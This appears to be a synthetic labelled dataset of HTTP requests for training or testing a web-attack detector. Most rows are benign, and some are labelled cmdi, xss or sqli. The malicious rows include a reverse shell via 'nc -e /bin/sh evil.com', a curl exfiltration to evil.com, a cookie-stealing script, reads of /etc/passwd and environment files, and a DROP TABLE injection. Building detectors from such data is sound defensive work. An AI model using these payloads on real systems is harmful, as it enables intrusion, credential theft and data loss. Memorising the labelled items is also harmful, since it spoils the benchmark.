method,url,headers,body,label
GET,/api/v1/users/66677/profile?min=4519&q=watch&input=; curl http://evil.com/$(whoami),"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.33.78.84""}",,cmdi
DELETE,/dashboard/apps/49117/metrics?format=csv&q=ubuntu&offset=161&filter=portfolio,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.254.173.1""}",,benign
GET,/items/21265?page=19&offset=384&max=41267&format=xml,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*""}",,benign
DELETE,/categories/sports/products?lang=fr&max=53565,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/api/v1/users/93377/profile?offset=498&max=benchmark%20comparison%202026&min=4857&limit=22,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/admin/settings/security""}",,benign
PUT,/login?filter=electronics&max=28358,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.88.99.59""}","{""title"": ""novel"", ""category"": ""studio"", ""name"": ""diner"", ""description"": ""terraform"", ""quantity"": ""202""}",benign
PUT,/items/57418?lang=en&min=275,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""email"": ""python"", ""name"": ""howto"", ""value"": ""keyboard"", ""quantity"": ""399""}",benign
GET,/blog/2026/journal-project,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/blog/2024/pet-biography-trousers""}",,benign
DELETE,/login?format=xml&input=<body onload=alert(1)>,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml""}",,xss
PUT,/checkout/cart?max=72628&search=%3B%20rm%20-rf%20%2Ftmp%2Ftest,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""title"": ""flat"", ""description"": ""villa""}",cmdi
DELETE,/register?q=select%20the%20best%20laptop%20for%20work&limit=47,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json""}",,benign
GET,"/categories/pets/products?q='""><script>fetch('http://evil.com?c='+document.cookie)</script>","{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml""}",,xss
POST,/login?filter=union%20select%20best%20coffee%20brands&lang=de&format=xml,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""value"": ""bag"", ""category"": ""tea"", ""quantity"": ""246"", ""email"": ""biography"", ""description"": ""food""}",benign
POST,/account/preferences?id=<img src=x onerror=alert(document.cookie)>,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""price"": ""92"", ""name"": ""guide"", ""title"": ""pizza"", ""category"": ""laptop""}",xss
GET,/account/preferences?offset=352&ref=homepage&max=order by date asc,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
PUT,/blog/2024/trousers-coffee-python-golang,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""comment"": ""cafe"", ""value"": ""vbscript:msgbox(1)"", ""description"": ""obrien"", ""search"": ""project""}",xss
DELETE,/blog/2024/pet-keyboard-laptop?filter=resume&search=admin'--,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/register""}",,sqli
GET,/account/preferences?lang=fr&min=3404,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""referer"": ""https://example.com/search""}",,benign
PUT,/register,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""category"": ""obrien"", ""price"": ""290"", ""name"": ""terraform"", ""description"": ""rust"", ""title"": ""docker""}",benign
POST,/login?max=43249&q=127.0.0.1 & nc -e /bin/sh evil.com 4444,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""price"": ""295"", ""description"": ""trousers"", ""title"": ""ansible"", ""email"": ""ring"", ""value"": ""book""}",cmdi
GET,/products/72081/reviews?filter=studio&max=96739,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/account/preferences""}",,benign
GET,/apps/36695?limit=37,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""referer"": ""https://example.com/api/apps/61747/deploy"", ""x-forwarded-for"": ""10.131.159.30""}",,benign
PUT,/docs/linux-biography-howto-guide?ref=social,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/account/preferences"", ""x-forwarded-for"": ""10.91.109.51""}","{""description"": ""salad"", ""search"": ""0x31272f2a"", ""value"": ""headphones""}",sqli
DELETE,/items/81766?q=group%20by%20category,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""referer"": ""https://example.com/login""}",,benign
PUT,/apps/78197/api/v1/items?filter=golang&offset=392&max=82471,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/login""}","{""description"": ""localhost;cat /etc/passwd"", ""search"": ""diner""}",cmdi
PUT,/register?page=33&min=McDonald's menu,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/account/preferences"", ""x-forwarded-for"": ""10.136.166.2""}","{""username"": ""python"", ""category"": ""monitor"", ""title"": ""trousers""}",benign
POST,/docs/salad-camera-diner-docker?lang=de&limit=27,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""name"": ""coffee"", ""email"": ""python"", ""price"": ""261"", ""title"": ""golang""}",benign
GET,/blog/2023/ubuntu-javascript-howto-studio?filter=obrien&category=food&format=csv,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/dashboard/apps/97606/metrics"", ""x-forwarded-for"": ""10.53.55.150""}",,benign
PUT,/dashboard/apps/50489/metrics?q=howto&page=2&ref=social&lang=de,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""name"": ""journal"", ""price"": ""107"", ""value"": ""java"", ""username"": ""diner"", ""email"": ""java""}",benign
POST,/register?min=2750&max=47051,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""value"": ""smoothie"", ""username"": ""monitor"", ""name"": ""studio""}",benign
POST,/checkout/cart?filter=electronics,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""description"": ""howto"", ""value"": ""journal"", ""price"": ""262"", ""email"": ""rust""}",benign
POST,/products/64334/reviews,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""username"": ""obrien"", ""email"": ""electronics"", ""value"": ""camera"", ""name"": ""salad""}",benign
PUT,/admin/settings/security?limit=11&filter=whiskas,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/register"", ""x-forwarded-for"": ""10.41.153.164""}","{""quantity"": ""460"", ""email"": ""rust"", ""name"": ""cat""}",benign
PUT,/admin/settings/security?max=70966,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""quantity"": ""362"", ""price"": ""32""}",benign
PUT,/register?offset=490&ref=social,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""category"": ""ansible"", ""email"": ""jacket"", ""description"": ""keyboard""}",benign
DELETE,/items/43254?category=clothing&lang=de,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""application/json"", ""x-forwarded-for"": ""10.248.14.110""}",,benign
DELETE,/api/apps/48808/deploy?sort=relevance&q=ansible&brand=lg,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""application/json"", ""referer"": ""https://example.com/login""}",,benign
DELETE,/apps/80148?q=javascript tutorial for beginners,"{""user-agent"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/register""}",,benign
GET,/search?format=csv&lang=fr,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/api/v1/users/92321/profile""}",,benign
GET,/apps/76830?q=id verification process,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json"", ""referer"": ""https://example.com/dashboard/apps/50674/metrics""}",,benign
POST,/apps/10827?limit=85&q=expression%28alert%281%29%29,"{""user-agent"": ""expression(alert(1))"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/items/93067""}","{""username"": ""villa"", ""category"": ""golang"", ""value"": ""ansible""}",xss
DELETE,/api/v2/orders/32924/items?q=guide&page=36&max=27081&input=0x31272f2a,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""*/*""}",,sqli
DELETE,/apps/app-40845/dashboard?max=25821,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
POST,/admin/settings/security?category=furniture,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""username"": ""linux"", ""category"": ""trousers"", ""title"": ""golang"", ""description"": ""dog""}",benign
POST,/apps/36595/api/v1/items,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""description"": ""8.8.8.8; cat /proc/self/environ"", ""search"": ""juice""}",cmdi
POST,/account/preferences,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json""}","{""value"": ""golang"", ""quantity"": ""82""}",benign
DELETE,/blog/2023/jacket-java-howto?limit=63&brand=samsung,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
POST,/api/apps/22336/deploy?page=4&limit=57,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json""}","{""quantity"": ""430"", ""title"": ""jacket"", ""username"": ""typescript"", ""value"": ""laptop""}",benign
GET,/categories/furniture/products?q=price%20%3E%20100%20%26%20%3C%20500,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/categories/clothing/products,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""referer"": ""https://example.com/search"", ""x-forwarded-for"": ""10.82.1.206""}",,benign
GET,/checkout/cart?category=electronics&lang=ja&filter=monitor,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""text/html,application/xhtml+xml""}",,benign
GET,/api/v1/users/43601/profile?sort=rating&q=rust&offset=291&search=<details open ontoggle=alert(1)>,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.92.76.25""}",,xss
PUT,/apps/5300?q=localhost;cat /etc/passwd,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.84.8.114""}","{""category"": ""laptop"", ""email"": ""textbook"", ""value"": ""textbook"", ""description"": ""pizza"", ""price"": ""147""}",cmdi
GET,/account/preferences?ref=search&category=clothing&q=vbscript:msgbox(1),"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json"", ""referer"": ""https://example.com/account/preferences""}",,xss
POST,/dashboard/apps/93665/metrics?filter=typescript&input=<iframe src=javascript:alert(1)>,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/search""}","{""category"": ""tea"", ""quantity"": ""412"", ""title"": ""apartment"", ""username"": ""typescript"", ""value"": ""terraform""}",xss
PUT,/dashboard/apps/54670/metrics?category=books&max=43898,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.220.251.1""}","{""email"": ""flat"", ""quantity"": ""33"", ""price"": ""287""}",benign
GET,/api/v2/orders/25593/items?brand=purina&min=3433&limit=11&lang=es,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.204.224.30""}",,benign
DELETE,/api/apps/77272/deploy?brand=apple&offset=398&q=tutorial,"{""user-agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36"", ""accept"": ""application/json""}",,benign
GET,/login?sort=rating&search=127.0.0.1 & nc -e /bin/sh evil.com 4444,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""text/html,application/xhtml+xml"", ""referer"": ""https://example.com/products/62018/reviews"", ""x-forwarded-for"": ""10.99.87.127""}",,cmdi
DELETE,/account/preferences?ref=homepage&q=pizza,"{""user-agent"": ""Go-http-client/1.1"", ""accept"": ""application/json""}",,benign
POST,/dashboard/apps/84137/metrics?limit=31&brand=whiskas,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.160.66.123""}","{""description"": ""java"", ""email"": ""dog""}",benign
POST,/api/v2/orders/72408/items?page=document.cookie policy explained&q=laptop&limit=44,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/blog/2024/shoes-juice-howto""}","{""description"": ""java"", ""email"": ""camera"", ""username"": ""headphones""}",benign
POST,/apps/23364?limit=82&max=76123&offset=56&min=2528,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/items/39657""}","{""description"": ""resume"", ""username"": ""cafe""}",benign
POST,/docs/apartment-golang-pizza,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""content-type"": ""application/json"", ""x-forwarded-for"": ""10.187.59.228""}","{""title"": ""coffee"", ""quantity"": ""443"", ""price"": ""129"", ""name"": ""burger"", ""email"": ""headphones""}",benign
GET,/checkout/cart?min=4349&ref=homepage,"{""user-agent"": ""PostmanRuntime/7.36"", ""accept"": ""text/html,application/xhtml+xml"", ""x-forwarded-for"": ""10.30.172.108""}",,benign
GET,/categories/food/products?sort=alert me when stock arrives,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""*/*"", ""x-forwarded-for"": ""10.52.62.13""}",,benign
POST,/login?q=whoami%20command%20line%20guide&limit=61,"{""user-agent"": ""axios/1.6.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/items/41717""}","{""category"": ""apartment"", ""title"": ""typescript"", ""username"": ""terraform""}",benign
DELETE,/search?max=96447,"{""user-agent"": ""python-requests/2.31.0"", ""accept"": ""*/*"", ""referer"": ""https://example.com/api/v1/users/51977/profile"", ""x-forwarded-for"": ""10.3.122.116""}",,benign
POST,/api/v2/orders/64310/items?filter=golang,"{""user-agent"": ""curl/8.4.0"", ""accept"": ""text/html,application/xhtml+xml"", ""content-type"": ""application/json""}","{""name"": ""coffee"", ""comment"": ""$(cat /etc/hosts)""}",cmdi
PUT,/docs/ansible-keyboard?offset=76&id=' OR 1=1; DROP TABLE users--,"{""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"", ""accept"": ""application/json"", ""content-type"": ""application/json"", ""referer"": ""https://example.com/docs/jacket-docker-dog-villa""}","{""description"": ""typescript"", ""username"": ""trousers""}",sqli
